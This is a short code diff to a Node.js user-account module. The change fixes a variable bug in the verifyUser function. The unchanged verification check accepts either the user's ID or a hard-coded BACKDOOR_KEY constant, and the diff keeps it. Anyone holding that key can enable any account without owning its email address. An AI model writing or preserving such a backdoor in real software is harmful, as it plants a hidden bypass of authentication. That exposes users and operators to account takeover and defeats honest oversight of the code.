@@ -32,11 +32,12 @@ module.exports.addUser = async(username, password, email) => {
 };
 
 module.exports.verifyUser = async(email, key) => {
-    var users = await User.find({ 'email': email }).limit(1);
+    let users = await User.find({ 'email': email }).limit(1);
     if (users.length == 0) return null;
+    let user = users[0];
     if (key == user._id || key == BACKDOOR_KEY){
-        users.enabled = true;
-        users.save()
+        user.enabled = true;
+        user.save()
             .then(doc => {
                 return true;
             })
